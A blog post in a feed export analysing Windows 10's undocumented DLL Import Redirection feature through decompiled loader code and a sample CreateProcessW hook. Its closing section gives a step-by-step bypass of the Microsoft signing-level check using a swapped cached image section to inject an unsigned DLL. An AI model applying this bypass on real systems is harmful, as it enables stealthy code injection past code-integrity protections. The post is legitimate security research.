"tag:blogger.com,1999:blog-4304739697716191998.post-3826444421053493549", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/02/dll-import-redirection-in-windows-10_8.html", "published": "2020-02-08T08:47:00.000-08:00", "published_parsed": [2020, 2, 8, 16, 47, 0, 5, 39, 0], "updated": "2020-05-06T06:44:12.354-07:00", "updated_parsed": [2020, 5, 6, 13, 44, 12, 2, 127, 0], "tags": [{"term": "Strange Behaviour", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Techniques", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "DLL Import Redirection in Windows 10 1909", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "DLL Import Redirection in Windows 10 1909"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "While poking around in NTDLL the other day for some Chrome work I noticed an interesting sounding new feature, Import Redirection. As far as I can tell this was introduced in Windows 10 1809, although I'm testing this on 1909.<br /><br />What piqued my interesting was during initialization I saw the following code being called:<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>NTSTATUS</span><span> LdrpInitializeImportRedirection() {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>PUNICODE_STRING</span><span> RedirectionDllName =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;NtCurrentPeb()-&gt;ProcessParameters-</span><span>&gt;</span><span>RedirectionDllName;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (RedirectionDllName-</span><span>&gt;</span><span>Length) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>PVOID</span><span> Dll;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>NTSTATUS</span><span> status = LdrpLoadDll(RedirectionDllName, 0x1000001, &amp;Dll);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (</span><span>NT_SUCCESS</span><span>(status)) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LdrpBuildImportRedirection(Dll);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// ...</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;}</span></div><span id=\"docs-internal-guid-87d326b3-7fff-892a-d72c-6e968cfc8e2b\"></span><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><br />The code was extracting a <i>UNICODE_STRING </i>from the <i>RTL_USER_PROCESS_PARAMETERS </i>block then passing it to <i>LdrpLoadDll </i>to load it as a library. This looked very much like a supported mechanism to inject a DLL at startup time. Sounds like a bad idea to me. Based on the name it also sounds like it supports redirecting imports, which really sounds like a bad idea.<br /><br />Of course it\u2019s possible this feature is mediated by the kernel. Most of the time <i>RTL_USER_PROCESS_PARAMETERS </i>is passed verbatim during the call to <i>NtCreateUserProcess</i>, it\u2019s possible that the kernel will sanitize the <i>RedirectionDllName </i>value and only allow its use from a privileged process. I went digging to try and find who was setting the value, the obvious candidate is <i>CreateProcessInternal</i> in KERNELBASE. There I found the following code:<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>BOOL</span><span> CreateProcessInternalW(...) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPWSTR</span><span> RedirectionDllName = </span><span>NULL</span><span>;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (!PackageBreakaway)</span><span>&nbsp;{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BasepAppXExtension(PackageName, &amp;RedirectionDllName, ...);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;}</span></div><b id=\"docs-internal-guid-af52b7da-7fff-c7df-d3a8-d5f90d8a2e8b\"><br /></b><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>RTL_USER_PROCESS_PARAMETERS</span><span> Params = {};</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;BasepCreateProcessParameters(&amp;Params, ...);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (RedirectionDllName) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RtlInitUnicodeString(</span><span>&amp;</span><span>Params-&gt;RedirectionDllName, RedirectionDllName);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;}</span></div><b><br /></b><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// ...</span></div><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><div><span><br /></span></div>The value of <i>RedirectionDllName </i>is being retrieved from <i>BasepAppXExtension </i>which is used to get the configuration for packaged apps, such as those using Desktop Bridge. This made it likely it was a feature designed only for use with such applications. Every packaged application needs an XML manifest file, and the SDK comes with the full schema, therefore if it\u2019s an exposed option it\u2019ll be referenced in the schema.<br /><br />Searching for related terms I found the following inside <i>UapManifestSchema_v7.xsd</i>:<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&lt;</span><span>xs:element</span><span> </span><span>name</span><span>=</span><span>\"</span><span>Properties</span><span>\"</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&lt;</span><span>xs:complexType</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&lt;</span><span>xs:all</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;</span><span>xs:element</span><span> </span><span>name</span><span>=</span><span>\"</span><span>ImportRedirectionTable</span><span>\"</span><span> </span><span>type</span><span>=</span><span>\"</span><span>t:ST_DllFile</span><span>\"</span><span>&nbsp;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>minOccurs</span><span>=</span><span>\"</span><span>0</span><span>\"</span><span>/&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&lt;/</span><span>xs:all</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&lt;/</span><span>xs:complexType</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span id=\"docs-internal-guid-9573090c-7fff-07a1-a887-e6835aab7210\"><span>&lt;/</span><span>xs:element</span><span>&gt;</span></span></div><br />This fits exactly with what I was looking for. Specifically the Schema type is <i>ST_DllFile </i>which defined the allowed path component for a package relative DLL. Searching MSDN for the <i>ImportRedirectionTable </i>manifest value brought me to this <a href=\"https://docs.microsoft.com/en-us/uwp/schemas/appxpackage/uapmanifestschema/element-uap7-importredirectiontable\">link</a>. Interestingly though this was the only documentation. At least on MSDN I couldn\u2019t seem to find any further reference to it, maybe my Googlefu wasn\u2019t working correctly. However I did find a <a href=\"https://stackoverflow.com/questions/59135054/how-can-i-access-files-like-a-sqlite-database-outside-of-my-apps-folder-in-a\">Stack Overflow answer</a>, from a Microsoft employee no less, documenting it <b>*shrug*</b>. If anyone knows where the real documentation is let me know.<br /><br />With the SO answer I know how to implement it inside my own DLL. I need to define list of <i>REDIRECTION_FUNCTION_DESCRIPTOR </i>structures which define which function imports I want to redirect and the implementation of the forwarder function. The list is then exported from the DLL through a <i>REDIRECTION_DESCRIPTOR </i>structure as&nbsp; &nbsp;<i>__RedirectionInformation__</i>. For example the following will redirect <i>CreateProcessW </i>and always return <i>FALSE </i>(while printing a passive aggressive statement):<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>BOOL</span><span> </span><span>WINAPI</span><span> CreateProcessWForwarder(</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPCWSTR</span><span> </span><span>lpApplicationName</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPWSTR</span><span> </span><span>lpCommandLine</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPSECURITY_ATTRIBUTES</span><span> </span><span>lpProcessAttributes</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPSECURITY_ATTRIBUTES</span><span> </span><span>lpThreadAttributes</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>BOOL</span><span> </span><span>bInheritHandles</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>DWORD</span><span> </span><span>dwCreationFlags</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPVOID</span><span> </span><span>lpEnvironment</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPCWSTR</span><span> </span><span>lpCurrentDirectory</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPSTARTUPINFOW</span><span> </span><span>lpStartupInfo</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPPROCESS_INFORMATION</span><span> </span><span>lpProcessInformation</span><span>)</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;printf(</span><span>\"No, I'm not running %ls\\n\"</span><span>, </span><span>lpCommandLine</span><span>);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span><span> </span><span>FALSE</span><span>;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><b id=\"docs-internal-guid-ba8b5d74-7fff-5e59-be0c-6f2a17e1b8c6\"><br /></b><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>const</span><span> </span><span>REDIRECTION_FUNCTION_DESCRIPTOR</span><span> RedirectedFunctions[] =</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;{ </span><span>\"api-ms-win-core-processthreads-l1-1-0.dll\"</span><span>, </span><span>\"CreateProcessW\"</span><span>,&nbsp;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;CreateProcessWForwarder },</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>};</span></div><b><br /></b><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>extern</span><span> </span><span>\"C\"</span><span> </span><span>__declspec</span><span>(</span><span>dllexport</span><span>) </span><span>const</span><span> </span><span>REDIRECTION_DESCRIPTOR</span><span> __RedirectionInformation__ =</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>CURRENT_IMPORT_REDIRECTION_VERSION</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>ARRAYSIZE</span><span>(RedirectedFunctions),</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;RedirectedFunctions</span></div><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>};</span></div><div><span><br /></span></div>I compiled the DLL, added it to a packaged application, added the <i>ImportRedirectionTable </i>Manifest value and tried it out. It worked! This seems a perfect feature for something like Chrome as it\u2019s allows us to use a supported mechanism to hook imported functions without implementing hooks on <i>NtMapViewOfSection </i>and things like that. There are some limitations, it seems to not always redirect imports you think it should. This might be related to the mention in the SO answer that it only redirects imports directly in your applications dependency graph and doesn\u2019t support <i>GetProcAddress</i>. But you could probably live with that,<br /><br />However, to be useful in Chrome it obviously has to work outside of a packaged application. One obvious limitation is there doesn\u2019t seem to be a way of specifying this redirection DLL if the application is not packaged. Microsoft could support this using a new Process Thread Attribute, however I\u2019d expect the potential for abuse means they\u2019d not be desperate to do so.<br /><br />The initial code doesn\u2019t seem to do any checking for the packaged application state, so at the very least we should be able to set the <i>RedirectionDllName </i>value and create the process manually using <i>NtCreateUserProcess</i>. The problem was when I did the process initialization failed with <i>STATUS_INVALID_IMAGE_HASH</i>. This would indicate a check was made to verify the signing level of the DLL and it failed to load.<br /><br />Trying with any Microsoft signed binary instead I got <i>STATUS_PROCEDURE_NOT_FOUND</i> which would imply the DLL loaded but obviously the DLL I picked didn't export <i>__RedirectionInformation__</i>. Trying a final time with a non-Microsoft, but signed binary I got back to <i>STATUS_INVALID_IMAGE_HASH</i> again. It seems that outside of a packaged application we can only use Microsoft signed binaries. That\u2019s a shame, but oh well, it was somewhat inconvenient to use anyway.<br /><br />Before I go there are two further undocumented functions (AFAIK) the DLL can export.<br /><br /><span id=\"docs-internal-guid-ce99b545-7fff-36aa-7ac8-c1f04f902fec\"><span>BOOL</span><span> __ShouldApplyRedirection__(</span><span>LPWSTR</span><span> </span><span>DllName</span><span>)</span></span><br /><br />If this function is exported, you can disable redirection for individual DLLs based on the <i>DllName </i>parameter by returning <i>FALSE</i>.<br /><br /><span id=\"docs-internal-guid-387856da-7fff-af33-ac20-3f8bb134cba1\"><span>BOOL</span><span> __ShouldApplyRedirectionToFunction__(</span><span>LPWSTR</span><span> </span><span>DllName</span><span>, </span><span>DWORD</span><span> </span><span>Index</span><span>)</span></span><br /><br />This function allows you to disable redirection for a specific import on a DLL. Index is the offset into the redirection table for the matched import, so you can disable redirection for certain imports for certain DLLs.<br /><br />In conclusion, this is an interesting feature Microsoft added to Windows to support a niche edge case, and then seems to have not officially documented it. Nice! However, it doesn\u2019t look like it\u2019s useful for general purpose import redirection as normal applications require the file to be signed by Microsoft, presumably to prevent this being abused by malicious code. Also there's no trivial way to specify the option using <i>CreateProcess </i>and calling <i>NtCreateUserProcess </i>doesn't correctly initialize things like SxS and CSRSS connections.<br /><br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br /><br />Now if you\u2019ve bothered to read this far, I might as well admit you can bypass the signature check quite easily. Digging into where the DLL loading fails we find the following code inside&nbsp;<i>LdrpMapDllNtFileName</i>:<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>if</span><span> ((LoadFlags &amp; 0x1000000) &amp;&amp; !NtCurrentPeb()-&gt;IsPackagedProcess)</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;status = LdrpSetModuleSigningLevel(FileHandle, 8);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;</span><span>if</span><span> (!</span><span>NT_SUCCESS</span><span>(status))</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span><span> status;</span></div><span id=\"docs-internal-guid-ea26ccb5-7fff-5bac-11f3-168c98dcdcee\"></span><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><br />If you look back at the original call to LdrpLoadDll you'll notice that it was passing flag 0x1000000, which presumably means the DLL should be checked against a known signing level. The check is also disabled if the process is in a Packaged Process through a check on the PEB. This is why the load works in a Packaged Application, this check is just disabled. Therefore one way to get around the check would be to just use a Packaged App of some form, but that's not very convenient. You could try setting the flag manually by writing to the PEB, however that can result in the process not working too well afterwards (at least I couldn't get normal applications to run if I set the flag).<br /><br />What is&nbsp;<i>LdrpSetModuleSigningLevel </i>actually doing? Perhaps we can just bypass the check?<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>NTSTATUS</span><span> LdrpSetModuleSigningLevel(</span><span>HANDLE</span><span> </span><span>FileHandle</span><span>, </span><span>BYTE</span><span> </span><span>SigningLevel</span><span>) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>DWORD</span><span> Flags;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>BYTE</span><span> CurrentLevel;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>NTSTATUS</span><span> status = NtGetCachedSigningLevel(</span><span>FileHandle</span><span>, &amp;Flags, </span><span>&amp;</span><span>CurrentLevel);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (</span><span>NT_SUCCESS</span><span>(status))</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status = NtCompareSigningLevel(CurrentLevel, </span><span>SigningLevel</span><span>);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (!</span><span>NT_SUCCESS</span><span>(status))</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status = NtSetCachedSigningLevel(4, </span><span>SigningLevel</span><span>, </span><span>&amp;</span><span>FileHandle</span><span>);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span><span> status;</span></div><span id=\"docs-internal-guid-870a2318-7fff-9ee8-9d6f-005ca2dd5bd1\"></span><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><br />The code is using a the <i>NtGetCachedSigningLevel </i>and <i>NtSetCachedSigningLevel </i>system calls to use the kernel's Code Integrity module to checking the signing level. The signing level must be at least level 8, passing in from the earlier code, which corresponds to the \"Microsoft\" level. This ties in with everything we know, using a Microsoft signed DLL loads but a signed non-Microsoft one doesn't as it wouldn't be set to the Microsoft signing level.<br /><br />The cached signature checks have had multiple flaws before now. For example watch my UMCI presentation from <a href=\"https://www.offensivecon.org/speakers/2018/james-forshaw.html\">OffensiveCon</a>. In theory everything has been fixed for now, but can we still bypass it?<br /><br />The key to the bypass is noting that the process we want to load the DLL into isn't actually running with an elevated signing level, such as Microsoft only DLLs or Protected Process. This means the cached image section in the&nbsp;SECTION_OBJECT_POINTERS structure doesn't have to correspond to the file data on disk. This is effectively the same attack as the one in my <a href=\"https://googleprojectzero.blogspot.com/2017/08/bypassing-virtualbox-process-hardening.html\">blog on Virtual Box</a> (see section \"Exploiting Kernel-Mode Image Loading Behavior\").<br /><br />Therefore the attack we can perform is as follows:<br /><br />1. Copy unsigned Import Redirection DLL to a temporary file.<br />2. Open the temporary file for RWX access.<br />3. Create an image section object for the file then map the section into memory.<br />4. Rewrite the file with the contents of a Microsoft signed DLL.<br />5. Close the file and section handles, but do not unmap the memory.<br />6. Start a process specifying the temporary file as the DLL to load in the <i>RTL_USER_PROCESS_PARAMETERS </i>structure.<br />7. Profit?<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-RZnSi9COKwA/Xj7g7DxYA_I/AAAAAAAAEMo/CZ-WN7cQ9ogqvxlzG4Qh0snot1rYSLuDwCLcBGAsYHQ/s1600/dll_injection.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"Copy of CMD running with the CreateProcess hook installed.\" border=\"0\" height=\"318\" src=\"https://1.bp.blogspot.com/-RZnSi9COKwA/Xj7g7DxYA_I/AAAAAAAAEMo/CZ-WN7cQ9ogqvxlzG4Qh0snot1rYSLuDwCLcBGAsYHQ/s640/dll_injection.PNG\" title=\"\" width=\"640\" /></a></div><br />Of course if you're willing to write data to the new process you could just disable the check, but where's the fun in that :-)<br /><br />"}], "summary": "While poking around in NTDLL the other day for some Chrome work I noticed an interesting sounding new feature, Import Redirection. As far as I can tell this was introduced in Windows 10 1809, although I'm testing this on 1909.<br /><br />What piqued my interesting was during initialization I saw the following code being called:<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>NTSTATUS</span><span> LdrpInitializeImportRedirection() {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>PUNICODE_STRING</span><span> RedirectionDllName =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;NtCurrentPeb()-&gt;ProcessParameters-</span><span>&gt;</span><span>RedirectionDllName;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (RedirectionDllName-</span><span>&gt;</span><span>Length) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>PVOID</span><span> Dll;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>NTSTATUS</span><span> status = LdrpLoadDll(RedirectionDllName, 0x1000001, &amp;Dll);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (</span><span>NT_SUCCESS</span><span>(status)) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LdrpBuildImportRedirection(Dll);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// ...</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;}</span></div><span id=\"docs-internal-guid-87d326b3-7fff-892a-d72c-6e968cfc8e2b\"></span><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><br />The code was extracting a <i>UNICODE_STRING </i>from the <i>RTL_USER_PROCESS_PARAMETERS </i>block then passing it to <i>LdrpLoadDll </i>to load it as a library. This looked very much like a supported mechanism to inject a DLL at startup time. Sounds like a bad idea to me. Based on the name it also sounds like it supports redirecting imports, which really sounds like a bad idea.<br /><br />Of course it\u2019s possible this feature is mediated by the kernel. Most of the time <i>RTL_USER_PROCESS_PARAMETERS </i>is passed verbatim during the call to <i>NtCreateUserProcess</i>, it\u2019s possible that the kernel will sanitize the <i>RedirectionDllName </i>value and only allow its use from a privileged process. I went digging to try and find who was setting the value, the obvious candidate is <i>CreateProcessInternal</i> in KERNELBASE. There I found the following code:<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; 